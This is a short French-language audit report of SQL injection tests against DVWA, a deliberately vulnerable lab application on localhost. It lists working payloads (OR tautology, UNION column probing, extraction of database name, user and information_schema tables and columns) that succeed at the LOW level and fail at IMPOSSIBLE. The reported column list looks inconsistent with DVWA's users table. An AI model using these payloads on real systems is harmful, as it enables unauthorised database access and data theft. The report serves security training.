# SQL Injection - Rapport d'audit

**Catégorie OWASP Top 10** : A03:2021 - Injection
**Sévérité** : Critique
**URL testée** : http://localhost/DVWA/vulnerabilities/sqli/
**Date du test** : 07/07/2026

---

## Messages observés

**Succès** :
Affichage des informations utilisateur

**Échec** :
Fatal error: Uncaught mysqli_sql_exception ...
(Aucun résultat - Niveau IMPOSSIBLE)

---

## Résultats des tests

### Niveau LOW

**Test 1 : Comportement normal**
- Payload : 1
- Résultat : First name: admin / Surname: admin

**Test 2 : Injection simple**
- Payload : 1' OR '1'='1
- Résultat : Tous les utilisateurs affichés (admin, Gordon, Hack, Pablo, Bob)

**Test 3 : Union injection (nombre de colonnes)**
- Payload : 1' UNION SELECT 1 --
- Résultat : Erreur (nombre de colonnes différent)

- Payload : 1' UNION SELECT 1,2 --
- Résultat : Succès (2 colonnes)

**Test 4 : Extraire la base et l'utilisateur**
- Payload : 1' UNION SELECT database(), user() --
- Résultat : dvwa / dvwa@localhost

**Test 5 : Extraire les tables**
- Payload : 1' UNION SELECT table_name, 2 FROM information_schema.tables --
- Résultat : Liste des tables (COLUMNS, TABLES, USERS, etc.)

**Test 6 : Extraire les colonnes de la table users**
- Payload : 1' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users' --
- Résultat : USER, PASSWORD_ERRORS, PASSWORD_EXPIRATION_TIME

---

### Niveau IMPOSSIBLE

**Test 1 : Injection simple**
- Payload : 1' OR '1'='1
- Résultat : Aucun résultat (requête vide)

**Test 2 : Union injection**
- Payload : 1' UNION SELECT database(), user() --
- Résultat : Aucun résultat (requête vide)


